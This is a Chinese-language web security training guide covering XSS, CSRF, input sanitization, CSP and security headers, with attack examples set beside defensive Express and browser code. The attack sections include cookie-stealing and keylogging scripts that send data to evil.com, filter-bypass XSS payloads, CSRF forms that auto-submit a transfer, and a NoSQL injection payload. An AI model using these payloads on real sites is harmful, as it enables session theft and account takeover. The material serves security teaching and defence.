# Web 安全专项训练 — XSS / CSRF / Sanitization / CSP

> **日期**: 2026-05-02 13:00  
> **主题**: Web 安全攻防 — 从原理到实战，写安全代码  
> **覆盖**: XSS (3 种) / CSRF / Sanitization / CSP / 安全头 / 攻防演练  
> **目标**: 理解每种攻击的原理 → 能写出安全代码 → 能审计现有代码

---

## 目录

1. [XSS 攻击与防御](#1-xss-攻击与防御)
2. [CSRF 攻击与防御](#2-csrf-攻击与防御)
3. [Sanitization 净化](#3-sanitization-净化)
4. [Content Security Policy (CSP)](#4-content-security-policy-csp)
5. [安全 HTTP 头](#5-安全-http-头)
6. [综合攻防演练](#6-综合攻防演练)
7. [安全代码 Checklist](#7-安全代码-checklist)
8. [面试自测](#8-面试自测)

---

## 1. XSS 攻击与防御

### 1.1 XSS 的本质

XSS（Cross-Site Scripting）的本质：**浏览器将不可信数据当作可执行代码运行**。

```
不可信数据 ──→ DOM / eval / innerHTML / src / href ──→ 代码执行
```

三种类型：

| 类型 | 注入点 | 触发方式 | 危害 |
|------|--------|----------|------|
| 反射型 | URL 参数 → 页面输出 | 钓鱼链接 | 一次性，需用户点击 |
| 存储型 | 数据库 → 页面输出 | 访问页面即触发 | 持久化，影响所有用户 |
| DOM 型 | JS 操作 DOM（不经过服务端） | 前端处理不可信数据 | 服务端无法检测 |

### 1.2 反射型 XSS — 攻击与防御

#### 🔴 攻击代码

```html
<!-- 恶意 URL -->
https://example.com/search?q=<img src=x onerror="alert(document.cookie)">

<!-- 服务端渲染（不安全） -->
<!-- 假设服务端代码： -->
<!-- res.send(`<h1>搜索结果: ${req.query.q}</h1>`) -->

<!-- 最终 HTML -->
<h1>搜索结果: <img src=x onerror="alert(document.cookie)"></h1>
```

```html
<!-- 更隐蔽的窃取 Cookie -->
https://example.com/search?q=<script>
  fetch('https://evil.com/steal?c=' + document.cookie)
</script>

<!-- 键盘记录器 -->
<script>
  document.onkeypress = (e) => {
    fetch('https://evil.com/log', {
      method: 'POST',
      body: JSON.stringify({ key: e.key, url: location.href })
    })
  }
</script>
```

#### 🟢 防御代码

```javascript
// ===== 方案 1: HTML 转义（服务端渲染） =====

function escapeHtml(str) {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#x27;',
    '/': '&#x2F;',
    '`': '&#96;'
  }
  return String(str).replace(/[&<>"'/`]/g, (c) => map[c])
}

// Express 示例
app.get('/search', (req, res) => {
  const q = escapeHtml(req.query.q || '')
  res.send(`<h1>搜索结果: ${q}</h1>`)
})

// ===== 方案 2: 使用 textContent（客户端） =====

// ❌ 危险
document.getElementById('result').innerHTML = userInput

// ✅ 安全
document.getElementById('result').textContent = userInput

// ===== 方案 3: 使用模板引擎自动转义 =====

// EJS / Pug / Nunjucks 默认自动转义
// <%- raw %> 才输出原始 HTML（需确认安全）

// ===== 方案 4: DOMPurify（需要渲染 HTML 时） =====

// npm install dompurify jsdom
import DOMPurify from 'dompurify'
import { JSDOM } from 'jsdom'

const window = new JSDOM('').window
const purify = DOMPurify(window)

const clean = purify.sanitize(userInput, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
  ALLOWED_ATTR: ['href'],
  ALLOW_DATA_ATTR: false,
  // 禁止事件处理器
  FORBID_TAGS: ['script', 'style', 'iframe', 'object', 'embed'],
  FORBID_ATTR: ['onerror', 'onload', 'onclick']
})

document.getElementById('result').innerHTML = clean
```

### 1.3 存储型 XSS — 攻击与防御

#### 🔴 攻击场景

```javascript
// 攻击者提交恶意评论
POST /api/comments
{
  "postId": 42,
  "content": "<img src=x onerror='fetch(\"https://evil.com/steal?c=\"+document.cookie)'>",
  "author": "hacker"
}

// 存储到数据库后，所有访问该页面的用户都会执行恶意代码
// 每个用户访问时，服务端渲染：
// <div class="comment">
//   <img src=x onerror='fetch("https://evil.com/steal?c="+document.cookie)'>
// </div>
```

#### 🟢 防御代码

```javascript
// ===== 服务端：入库前净化 =====

const { JSDOM } = require('jsdom')
const createDOMPurify = require('dompurify')

const window = new JSDOM('').window
const DOMPurify = createDOMPurify(window)

// 评论入库前净化
app.post('/api/comments', async (req, res) => {
  const { content, author } = req.body

  // 1. 净化 HTML
  const cleanContent = DOMPurify.sanitize(content, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'ol', 'li'],
    ALLOWED_ATTR: ['href', 'title'],
    ALLOWED_URI_REGEXP: /^(https?:\/\/|mailto:|#)/i,
    // 禁止 javascript: 协议
    RETURN_DOM: false
  })

  // 2. 限制长度
  if (cleanContent.length > 5000) {
    return res.status(400).json({ error: '评论过长' })
  }

  // 3. 入库
  const comment = await db.comments.create({
    content: cleanContent,
    author: author.trim().slice(0, 50), // 也净化作者名
    postId: req.body.postId
  })

  res.json(comment)
})

// ===== 输出端：双重保险 =====

// 即使入库时净化了，输出时也要确保安全
// 如果使用模板引擎，默认转义
// 如果使用 innerHTML，再次净化

function renderComment(comment) {
  // 模板引擎（自动转义）
  return `<div class="comment">${escapeHtml(comment.content)}</div>`
}

// 如果需要保留 HTML 格式
function renderRichComment(comment) {
  const clean = DOMPurify.sanitize(comment.content, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br']
  })
  return `<div class="comment">${clean}</div>`
}
```

### 1.4 DOM 型 XSS — 攻击与防御

#### 🔴 攻击场景

```html
<!-- 不安全的客户端代码 -->
<script>
  // ❌ 从 URL 读取并直接写入 DOM
  const params = new URLSearchParams(location.search)
  const name = params.get('name')
  document.getElementById('greeting').innerHTML = `欢迎, ${name}!`

  // ❌ 使用 eval 处理 URL 参数
  const callback = params.get('callback')
  eval(callback + '()')

  // ❌ 动态设置 src/href
  const imgUrl = params.get('img')
  document.getElementById('avatar').src = imgUrl  // 可设为 javascript:alert(1)

  // ❌ location.hash 直接操作
  const section = location.hash.slice(1)
  document.querySelector(`#${section}`).scrollIntoView()
  // 如果 section = 'foo" onclick="alert(1)'
</script>
```

#### 🟢 防御代码

```javascript
// ===== DOM 型 XSS 防御原则 =====

// 原则 1: 永远不要将不可信数据写入 innerHTML
function safeGreeting(name) {
  const el = document.getElementById('greeting')
  // ✅ 使用 textContent
  el.textContent = `欢迎, ${name}!`
}

// 原则 2: 永远不要 eval / new Function 处理不可信数据
function safeCallback(callbackName) {
  // ✅ 白名单映射
  const allowedCallbacks = {
    'onSuccess': onSuccess,
    'onError': onError,
    'onComplete': onComplete
  }
  const fn = allowedCallbacks[callbackName]
  if (fn) fn()
}

// 原则 3: 安全设置 URL 属性
function safeSetImage(imgEl, url) {
  // ✅ 协议白名单
  if (/^https?:\/\//.test(url)) {
    imgEl.src = url
  } else {
    imgEl.src = '/default-avatar.png'
  }
}

// 原则 4: 安全处理 location.hash
function safeScrollToSection() {
  const hash = location.hash.slice(1)
  // ✅ 使用 querySelector 时转义
  try {
    const el = document.getElementById(hash) // ✅ 用 getElementById 代替 querySelector
    if (el) el.scrollIntoView()
  } catch (e) {
    // 无效的选择器，忽略
  }
}

// 原则 5: 安全处理 postMessage
window.addEventListener('message', (event) => {
  // ✅ 验证 origin
  if (event.origin !== 'https://trusted-domain.com') return

  // ✅ 验证数据格式
  const data = event.data
  if (typeof data !== 'object' || !data.type) return

  // ✅ 不将数据直接写入 DOM
  if (data.type === 'update') {
    document.getElementById('content').textContent = String(data.content)
  }
})

// 原则 6: 使用 URL 安全编码
function safeUrlParam(value) {
  return encodeURIComponent(value)
}

// 使用
const link = document.createElement('a')
link.href = `/profile?name=${safeUrlParam(userName)}`
```

### 1.5 进阶 XSS 技术

```javascript
// ===== 绕过过滤的常见手法 =====

// 1. 大小写混合
<ImG sRc=x oNeRrOr=alert(1)>

// 2. 双写绕过
<scr<script>ipt>alert(1)</scr</script>ipt>

// 3. HTML 编码
<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;(1)">

// 4. 利用 CSS expression（旧 IE）
<div style="width: expression(alert(1))">

// 5. data: URI
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click</a>

// 6. javascript: 协议
<a href="javascript:alert(1)">click</a>
<img src="javascript:alert(1)">

// 7. SVG 内嵌脚本
<svg><script>alert(1)</script></svg>

// 8. 事件处理器变体
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<video><source onerror="alert(1)">

// ===== 防御：纵深防御策略 =====

// 第一层: 输入净化 (DOMPurify)
// 第二层: 输出转义 (escapeHtml / textContent)
// 第三层: CSP (内容安全策略)
// 第四层: HttpOnly Cookie (防止 document.cookie 被读取)
// 第五层: 安全头 (X-XSS-Protection, X-Content-Type-Options)
```

---

## 2. CSRF 攻击与防御

### 2.1 CSRF 的本质

CSRF（Cross-Site Request Forgery）的本质：**利用用户已登录的身份，在用户不知情的情况下执行恶意操作**。

```
用户登录了 Bank.com (Cookie 有效)
  ↓
用户访问了 Evil.com
  ↓
Evil.com 包含: <img src="https://bank.com/transfer?to=hacker&amount=10000">
  ↓
浏览器自动携带 Cookie 发送请求
  ↓
Bank.com 收到"合法"请求，执行转账
```

### 2.2 攻击代码

```html
<!-- Evil.com 上的恶意页面 -->

<!-- 方式 1: 图片标签触发 GET 请求 -->
<img src="https://bank.com/api/transfer?to=hacker&amount=10000" 
     style="display:none">

<!-- 方式 2: 自动提交的表单 (POST) -->
<form action="https://bank.com/api/transfer" method="POST" id="csrf-form">
  <input type="hidden" name="to" value="hacker">
  <input type="hidden" name="amount" value="10000">
</form>
<script>
  document.getElementById('csrf-form').submit()
</script>

<!-- 方式 3: Fetch API (带 credentials) -->
<script>
  fetch('https://bank.com/api/transfer', {
    method: 'POST',
    credentials: 'include', // 携带 Cookie
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: 'to=hacker&amount=10000'
  })
</script>

<!-- 方式 4: 表单 + 自动提交 (更隐蔽) -->
<body onload="document.forms[0].submit()">
<form action="https://bank.com/api/change-email" method="POST">
  <input type="hidden" name="email" value="hacker@evil.com">
</form>
```

### 2.3 防御代码

```javascript
// ===== 方案 1: CSRF Token（最常用） =====

// 服务端生成 Token
const crypto = require('crypto')
const session = require('express-session')

app.use(session({
  secret: process.env.SESSION_SECRET,
  resave: false,
  saveUninitialized: false,
  cookie: {
    httpOnly: true,
    secure: true,     // HTTPS only
    sameSite: 'lax'   // 同站策略
  }
}))

// 生成 CSRF Token
app.get('/api/csrf-token', (req, res) => {
  if (!req.session.csrfToken) {
    req.session.csrfToken = crypto.randomBytes(32).toString('hex')
  }
  res.json({ csrfToken: req.session.csrfToken })
})

// 验证 CSRF Token
function csrfMiddleware(req, res, next) {
  if (['GET', 'HEAD', 'OPTIONS'].includes(req.method)) {
    return next()
  }

  const token = req.headers['x-csrf-token'] || req.body._csrf
  if (!token || token !== req.session.csrfToken) {
    return res.status(403).json({ error: 'Invalid CSRF token' })
  }
  next()
}

app.use(csrfMiddleware)

// 前端发送 Token
async function safePost(url, data) {
  const response = await fetch(url, {
    method: 'POST',
    credentials: 'same-origin',
    headers: {
      'Content-Type': 'application/json',
      'X-CSRF-Token': getCsrfToken() // 从 meta 标签或 API 获取
    },
    body: JSON.stringify(data)
  })
  return response.json()
}

// ===== 方案 2: SameSite Cookie（浏览器原生防御） =====

// Set-Cookie: session=abc123; SameSite=Lax; Secure; HttpOnly
//
// SameSite 三种模式:
// - Strict: 完全禁止跨站携带 Cookie（最安全，可能影响用户体验）
// - Lax:    仅允许顶级导航（GET 链接/表单）携带 Cookie（默认推荐）
// - None:   允许跨站携带（需配合 Secure，用于跨域嵌入场景）

// Express 配置
app.use(session({
  cookie: {
    sameSite: 'lax',  // 推荐 lax
    secure: true,     // 必须 HTTPS
    httpOnly: true    // 防止 JS 读取
  }
}))

// ===== 方案 3: Double Submit Cookie =====

// 原理: Token 同时存在 Cookie 和请求体中，服务端比对
// 优点: 无服务端状态
// 缺点: 如果 Cookie 被窃取则无效

function setDoubleSubmitCookie(req, res) {
  const token = crypto.randomBytes(32).toString('hex')
  res.cookie('csrf_token', token, {
    httpOnly: false,  // 前端需要读取
    secure: true,
    sameSite: 'lax'
  })
  return token
}

function verifyDoubleSubmit(req, res, next) {
  const cookieToken = req.cookies.csrf_token
  const bodyToken = req.headers['x-csrf-token']

  if (!cookieToken || !bodyToken || cookieToken !== bodyToken) {
    return res.status(403).json({ error: 'CSRF verification failed' })
  }
  next()
}

// ===== 方案 4: Origin / Referer 验证 =====

function originCheck(req, res, next) {
  if (['GET', 'HEAD', 'OPTIONS'].includes(req.method)) {
    return next()
  }

  const origin = req.headers.origin
  const referer = req.headers.referer
  const allowedHosts = ['example.com', 'www.example.com']

  if (origin) {
    const originHost = new URL(origin).hostname
    if (!allowedHosts.includes(originHost)) {
      return res.status(403).json({ error: 'Invalid origin' })
    }
  }

  if (referer) {
    const refererHost = new URL(referer).hostname
    if (!allowedHosts.includes(refererHost)) {
      return res.status(403).json({ error: 'Invalid referer' })
    }
  }

  next()
}

// ===== 方案 5: 自定义请求头 =====

// 原理: 跨站请求无法设置自定义头（CORS 预检会拦截）
// 适用: JSON API（application/json 触发 CORS 预检）

app.use((req, res, next) => {
  // JSON API 默认需要 Content-Type: application/json
  // 这会触发 CORS 预检，浏览器自动验证
  if (req.method !== 'GET' && req.method !== 'HEAD') {
    const contentType = req.headers['content-type'] || ''
    if (contentType.includes('application/json')) {
      // CORS 中间件会处理预检
      return next()
    }
  }
  next()
})

// ===== 综合防御策略 =====

// 最佳实践: 多层防御
// 1. SameSite=Lax (浏览器层)
// 2. CSRF Token (应用层)
// 3. Origin 验证 (辅助层)
// 4. 自定义头 (JSON API 天然防御)
```

---

## 3. Sanitization 净化

### 3.1 输入净化 vs 输出净化

```
输入净化 (Sanitization):  数据入库前清洗 → 去除危险内容
输出净化 (Escaping):      数据展示时转义 → 将危险字符转为安全表示

最佳实践: 两者都做（纵深防御）
```

### 3.2 上下文感知的输出转义

```javascript
// ===== 不同上下文需要不同的转义策略 =====

// 上下文 1: HTML 内容
function escapeHtml(str) {
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;')
}

// 上下文 2: HTML 属性
function escapeHtmlAttr(str) {
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/`/g, '&#96;')
}

// 上下文 3: JavaScript 字符串
function escapeJs(str) {
  return String(str)
    .replace(/\\/g, '\\\\')
    .replace(/'/g, '\\\'')
    .replace(/"/g, '\\"')
    .replace(/`/g, '\\`')
    .replace(/\n/g, '\\n')
    .replace(/\r/g, '\\r')
    .replace(/</g, '\\x3C')
    .replace(/>/g, '\\x3E')
}

// 上下文 4: URL
function escapeUrl(str) {
  return encodeURIComponent(str)
}

// 上下文 5: URL 参数值
function escapeUrlParam(str) {
  return encodeURIComponent(str)
}

// 上下文 6: CSS
function escapeCss(str) {
  return String(str).replace(/[^\w\-]/g, (c) => {
    return '\\' + c.charCodeAt(0).toString(16) + ' '
  })
}

// ===== 实际使用示例 =====

// HTML 内容
// ❌ <div>${userInput}</div>
// ✅ <div>${escapeHtml(userInput)}</div>

// HTML 属性
// ❌ <div title="${userInput}">
// ✅ <div title="${escapeHtmlAttr(userInput)}">

// JavaScript 内联
// ❌ <script>var name = "${userInput}"</script>
// ✅ <script>var name = "${escapeJs(userInput)}"</script>

// URL
// ❌ <a href="${userInput}">
// ✅ <a href="${escapeUrl(userInput)}">
// 更安全的: 白名单验证
function safeHref(url) {
  try {
    const parsed = new URL(url, location.origin)
    if (parsed.protocol === 'https:' || parsed.protocol === 'http:') {
      return escapeUrl(url)
    }
  } catch (e) {
    // 无效 URL
  }
  return '#'
}
```

### 3.3 输入净化 — 结构化验证

```javascript
// ===== 使用 Zod 做输入验证 =====

import { z } from 'zod'

// 用户注册验证
const RegisterSchema = z.object({
  username: z.string()
    .min(3, '用户名至少 3 个字符')
    .max(20, '用户名最多 20 个字符')
    .regex(/^[a-zA-Z0-9_-]+$/, '只能包含字母、数字、下划线和连字符'),
  
  email: z.string()
    .email('无效的邮箱格式')
    .transform(v => v.toLowerCase().trim()),
  
  age: z.number()
    .int('年龄必须是整数')
    .min(1, '年龄必须大于 0')
    .max(150, '年龄无效'),
  
  bio: z.string()
    .max(500, '简介最多 500 个字符')
    .optional()
    .transform(v => v?.trim()),
  
  website: z.string()
    .url('无效的 URL')
    .refine(url => {
      try {
        const parsed = new URL(url)
        return parsed.protocol === 'https:'
      } catch {
        return false
      }
    }, '必须使用 HTTPS')
    .optional()
})

// 使用
app.post('/api/register', async (req, res) => {
  try {
    const validated = RegisterSchema.parse(req.body)
    // validated 是经过验证和转换的安全数据
    const user = await db.users.create(validated)
    res.json(user)
  } catch (error) {
    if (error instanceof z.ZodError) {
      res.status(400).json({ errors: error.errors })
    } else {
      throw error
    }
  }
})

// ===== SQL 注入防护 =====

// ❌ 危险: 字符串拼接
const query = `SELECT * FROM users WHERE id = '${req.params.id}'`

// ✅ 安全: 参数化查询
const query = 'SELECT * FROM users WHERE id = $1'
await db.query(query, [req.params.id])

// ✅ 使用 ORM (Prisma / Sequelize)
const user = await db.user.findUnique({
  where: { id: parseInt(req.params.id, 10) }
})

// ===== NoSQL 注入防护 =====

// ❌ 危险
const user = await db.users.findOne({
  username: req.body.username,
  password: req.body.password
})
// 攻击: { "username": { "$gt": "" }, "password": { "$gt": "" } }
// 这会匹配第一个用户（因为 "" > 任何字符串）

// ✅ 安全: 类型验证
const username = String(req.body.username).trim()
const password = String(req.body.password)

const user = await db.users.findOne({ username, password })
```

### 3.4 DOMPurify 高级配置

```javascript
// ===== DOMPurify 高级净化配置 =====

const purify = DOMPurify(window)

// 配置 1: 富文本编辑器
const richTextConfig = {
  ALLOWED_TAGS: [
    'b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'ol', 'li',
    'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'blockquote', 'pre', 'code',
    'table', 'thead', 'tbody', 'tr', 'th', 'td', 'img'
  ],
  ALLOWED_ATTR: [
    'href', 'target', 'rel', 'title', 'class', 'src', 'alt', 'width', 'height',
    'style', 'colspan', 'rowspan'
  ],
  ALLOWED_URI_REGEXP: /^(https?|mailto|tel):\/\//i,
  ADD_ATTR: ['target'],
  FORBID_TAGS: ['script', 'style', 'iframe', 'object', 'embed', 'form'],
  FORBID_ATTR: ['onerror', 'onload', 'onclick', 'onmouseover', 'onfocus'],
  KEEP_CONTENT: false,
  WHOLE_DOCUMENT: false
}

// 配置 2: Markdown 渲染
const markdownConfig = {
  ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'code', 'pre', 'a', 'ul', 'ol', 'li', 'h1', 'h2', 'h3', 'blockquote'],
  ALLOWED_ATTR: ['href', 'title'],
  ALLOWED_URI_REGEXP: /^(https?:\/\/|\/|#)/i
}

// 配置 3: 用户头像（仅允许 img）
const avatarConfig = {
  ALLOWED_TAGS: ['img'],
  ALLOWED_ATTR: ['src', 'alt', 'width', 'height'],
  ALLOWED_URI_REGEXP: /^https?:\/\//i,
  ALLOW_DATA_ATTR: false
}

// 使用
function sanitize(input, config) {
  return purify.sanitize(input, config)
}

// ===== 自定义钩子：过滤特定域名 =====

DOMPurify.addHook('afterSanitizeAttributes', (node) => {
  // 只允许特定域名的链接
  if (node.hasAttribute('href')) {
    const href = node.getAttribute('href')
    const allowedDomains = ['example.com', 'docs.example.com']
    try {
      const url = new URL(href)
      if (!allowedDomains.includes(url.hostname)) {
        node.setAttribute('href', '#')
        node.setAttribute('rel', 'nofollow noopener noreferrer')
      }
    } catch (e) {
      node.setAttribute('href', '#')
    }
  }
})
```

---

## 4. Content Security Policy (CSP)

### 4.1 CSP 的本质

CSP 是浏览器安全机制，通过 HTTP 头或 meta 标签告诉浏览器**只允许加载哪些来源的资源**。

```
没有 CSP: 浏览器加载所有资源（包括注入的恶意脚本）
有 CSP:   浏览器只加载白名单中的资源（注入的恶意脚本被拦截）
```

### 4.2 CSP 指令详解

```
# 基础 CSP 头
Content-Security-Policy: default-src 'self';

# 完整 CSP 配置
Content-Security-Policy: \
  default-src 'self';                              \
  script-src 'self' https://cdn.example.com;       \
  style-src 'self' 'unsafe-inline';                \
  img-src 'self' data: https:;                     \
  font-src 'self' https://fonts.gstatic.com;       \
  connect-src 'self' https://api.example.com;      \
  frame-src 'self' https://player.example.com;     \
  media-src 'self';                                \
  object-src 'none';                               \
  base-uri 'self';                                 \
  form-action 'self';                              \
  frame-ancestors 'none';                          \
  upgrade-insecure-requests;                       \
  block-all-mixed-content;

# 指令说明:
# default-src    默认策略（未指定指令时的回退）
# script-src     JavaScript 来源
# style-src      CSS 来源
# img-src        图片来源
# font-src       字体来源
# connect-src    fetch/XHR/WebSocket 来源
# frame-src      iframe 来源
# media-src      音视频来源
# object-src     <object>/<embed> 来源
# base-uri       <base> 标签来源
# form-action    <form> action 来源
# frame-ancestors 允许嵌入本页面的来源（替代 X-Frame-Options）
```

### 4.3 CSP 值详解

```
'self'          同源
'none'          禁止所有
'unsafe-inline' 允许内联 (style/script)
'unsafe-eval'   允许 eval() 等
'nonce-<base64>' 一次性随机值
'hash-<algo>-<hash>' 允许特定内容的内联脚本

# Nonce 示例
Content-Security-Policy: script-src 'self' 'nonce-abc123'

# HTML 中使用
<script nonce="abc123">
  // 只有带正确 nonce 的内联脚本才能执行
  console.log('safe')
</script>

# Hash 示例
Content-Security-Policy: script-src 'self' 'sha256-xyz...'

# HTML 中使用
<script>
  // 只有内容与 hash 匹配的内联脚本才能执行
  console.log('hello')
</script>
```

### 4.4 服务端 CSP 实现

```javascript
// ===== Express + Helmet（推荐） =====

const helmet = require('helmet')

app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: [
      "'self'",
      "'nonce-<dynamic>'", // 动态 nonce
      'https://cdn.example.com',
      'https://www.google-analytics.com'
    ],
    styleSrc: [
      "'self'",
      "'unsafe-inline'", // CSS 通常需要 unsafe-inline
      'https://fonts.googleapis.com'
    ],
    imgSrc: [
      "'self'",
      'data:',
      'https:',
      'https://avatars.githubusercontent.com'
    ],
    fontSrc: [
      "'self'",
      'https://fonts.gstatic.com'
    ],
    connectSrc: [
      "'self'",
      'https://api.example.com',
      'https://analytics.example.com'
    ],
    frameSrc: [
      'https://www.youtube.com',
      'https://player.vimeo.com'
    ],
    objectSrc: ["'none'"],
    baseUri: ["'self'"],
    formAction: ["'self'"],
    frameAncestors: ["'none'"],
    // 报告端点（开发/测试阶段）
    reportUri: '/api/csp-violation-report',
    // 升级 HTTP 为 HTTPS
    upgradeInsecureRequests: []
  }
}))

// ===== 动态 Nonce 实现 =====

function cspNonceMiddleware(req, res, next) {
  const crypto = require('crypto')
  const nonce = crypto.randomBytes(16).toString('base64')

  // 存储到 res.locals 供模板使用
  res.locals.cspNonce = nonce

  // 设置 CSP 头
  res.setHeader(
    'Content-Security-Policy',
    `default-src 'self'; script-src 'self' 'nonce-${nonce}'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; object-src 'none'; frame-ancestors 'none'`
  )

  next()
}

app.use(cspNonceMiddleware)

// 模板中使用
// <script nonce="<%= cspNonce %>">
//   // 内联脚本
// </script>

// ===== CSP 报告端点 =====

app.post('/api/csp-violation-report', (req, res) => {
  const report = req.body['csp-report'] || req.body
  console.error('CSP Violation:', {
    documentUri: report['document-uri'],
    violatedDirective: report['violated-directive'],
    blockedUri: report['blocked-uri'],
    originalPolicy: report['original-policy'],
    timestamp: new Date().toISOString()
  })
  res.status(204).end()
})

// ===== 测试模式 (Report-Only) =====

// 开发阶段使用 Report-Only，不拦截只报告
app.use(helmet.contentSecurityPolicy({
  useDefaults: true,
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'", "'unsafe-inline'"] // 宽松策略
  },
  reportOnly: true // 仅报告，不拦截
}))
```

### 4.5 CSP 实战场景

```javascript
// ===== 场景 1: 纯静态 SPA（React/Vue） =====

// CSP 策略
Content-Security-Policy: \
  default-src 'self'; \
  script-src 'self'; \
  style-src 'self'; \
  img-src 'self' data: blob:; \
  connect-src 'self' https://api.example.com; \
  font-src 'self'; \
  object-src 'none'; \
  frame-ancestors 'none'; \
  base-uri 'self'; \
  form-action 'none'

// 特点: 无内联脚本，无 eval，严格策略

// ===== 场景 2: SSR 应用（Next.js/Nuxt） =====

// CSP 策略（需要 nonce）
Content-Security-Policy: \
  default-src 'self'; \
  script-src 'self' 'nonce-<dynamic>'; \
  style-src 'self' 'unsafe-inline'; \
  img-src 'self' data: https:; \
  connect-src 'self' https://api.example.com; \
  object-src 'none'; \
  frame-ancestors 'none'

// 特点: 需要 nonce 支持内联脚本（ hydration 代码）

// ===== 场景 3: 嵌入第三方内容 =====

// 需要 YouTube 播放器 + Google Fonts + Analytics
Content-Security-Policy: \
  default-src 'self'; \
  script-src 'self' 'nonce-<dynamic>' \
    https://www.googletagmanager.com \
    https://www.google-analytics.com \
    https://cdn.jsdelivr.net; \
  style-src 'self' 'unsafe-inline' \
    https://fonts.googleapis.com \
    https://cdn.jsdelivr.net; \
  img-src 'self' data: https:; \
  font-src 'self' https://fonts.gstatic.com; \
  connect-src 'self' https://api.example.com \
    https://www.google-analytics.com; \
  frame-src https://www.youtube.com https://player.vimeo.com; \
  object-src 'none'; \
  frame-ancestors 'none'

// ===== 场景 4: 富文本编辑器 =====

// 用户可上传图片（data: URI）
Content-Security-Policy: \
  default-src 'self'; \
  script-src 'self' 'nonce-<dynamic>'; \
  style-src 'self' 'unsafe-inline'; \
  img-src 'self' data: blob: https:; \
  object-src 'none'; \
  frame-ancestors 'none'

// 配合 DOMPurify 净化用户输入
```

### 4.6 CSP 绕过与反绕过

```javascript
// ===== 常见 CSP 绕过手法 =====

// 1. 利用 'unsafe-inline'
// 如果 CSP 包含 'unsafe-inline'，内联脚本/样式可执行
// 反绕过: 使用 nonce 或 hash 替代 'unsafe-inline'

// 2. 利用第三方 CDN
// script-src 'self' https://cdn.example.com
// 如果 cdn.example.com 被入侵，恶意脚本可执行
// 反绕过: 使用 SRI (Subresource Integrity)
// <script src="https://cdn.example.com/lib.js"
//         integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9px7LV"
//         crossorigin="anonymous"></script>

// 3. 利用 JSONP
// <script src="https://api.example.com/data?callback=malicious">
// 反绕过: 服务端禁止 JSONP，使用 CORS + fetch

// 4. 利用上传的文件
// 用户上传 HTML 文件，通过 <iframe> 加载执行
// 反绕过: object-src 'none' + 设置 Content-Disposition: attachment

// 5. Prototype Pollution + CSP
// 通过原型链污染修改全局对象
// 反绕过: Object.freeze(window) + 严格输入验证

// ===== CSP Level 3 新特性 =====

// trusted-types: 防止 DOM XSS
Content-Security-Policy: \
  trusted-types *; \
  require-trusted-types-for 'script'

// 使用 Trusted Types
if (window.trustedTypes) {
  const policy = trustedTypes.createPolicy('default', {
    createHTML: (string) => DOMPurify.sanitize(string),
    createScriptURL: (url) => {
      if (/^https:\/\/trusted\.example\.com\//.test(url)) {
        return url
      }
      throw new Error('Untrusted URL')
    }
  })
  // 使用
  element.innerHTML = policy.createHTML(userInput)
}

// report-to: 新的报告机制（替代 report-uri）
Content-Security-Policy: \
  default-src 'self'; \
  report-to csp-endpoint

// 配合 Reporting API
// <script>
//   navigator.sendReport({
//     type: 'csp',
//     url: '/api/csp-report',
//     body: report
//   })
// </script>
```

---

## 5. 安全 HTTP 头

### 5.1 完整安全头配置

```javascript
// ===== Helmet 完整配置 =====

const helmet = require('helmet')

app.use(helmet())

// 各安全头说明:

// 1. X-Content-Type-Options: nosniff
//    防止浏览器 MIME 类型嗅探
//    攻击: 上传 .jpg 文件实际是 .html，浏览器可能执行
//    防御: 强制浏览器遵守 Content-Type

// 2. X-Frame-Options: DENY (已被 frame-ancestors CSP 替代)
//    防止点击劫持
//    攻击: 恶意网站用 <iframe> 嵌入你的网站，用户不知情点击
//    防御: 禁止被嵌入

// 3. X-XSS-Protection: 1; mode=block (已过时，现代浏览器默认启用)
//    浏览器内置 XSS 过滤器
//    注意: 现代浏览器已弃用，用 CSP 替代

// 4. Strict-Transport-Security (HSTS)
//    强制 HTTPS
//    攻击: MITM 降级攻击（HTTP 中间人）
//    防御: 浏览器记住只使用 HTTPS
app.use(helmet.hsts({
  maxAge: 31536000,        // 1 年
  includeSubDomains: true,  // 包括子域名
  preload: true             // 加入浏览器预加载列表
}))

// 5. Referrer-Policy
//    控制 Referer 头发送
app.use(helmet.referrerPolicy({
  policy: 'strict-origin-when-cross-origin'
}))

// 6. Permissions-Policy (原 Feature-Policy)
//    控制浏览器 API 权限
app.use(helmet.permissionsPolicy({
  features: {
    camera: ['none'],
    microphone: ['none'],
    geolocation: ['self'],
    payment: ['self'],
    usb: ['none'],
    accelerometer: ['none'],
    gyroscope: ['none'],
    magnetometer: ['none']
  }
}))

// 7. Cross-Origin-Opener-Policy
//    隔离浏览上下文
app.use(helmet.crossOriginOpenerPolicy({ policy: 'same-origin' }))

// 8. Cross-Origin-Embedder-Policy
//    要求跨域资源显式声明
app.use(helmet.crossOriginEmbedderPolicy({ policy: 'require-corp' }))

// 9. Cross-Origin-Resource-Policy
//    控制跨域资源访问
app.use(helmet.crossOriginResourcePolicy({ policy: 'same-origin' }))
```

### 5.2 安全 Cookie 配置

```javascript
// ===== Cookie 安全配置 =====

// 1. Session Cookie
app.use(session({
  cookie: {
    httpOnly: true,     // 防止 JS 读取（防 XSS 窃取）
    secure: true,       // 仅 HTTPS 传输
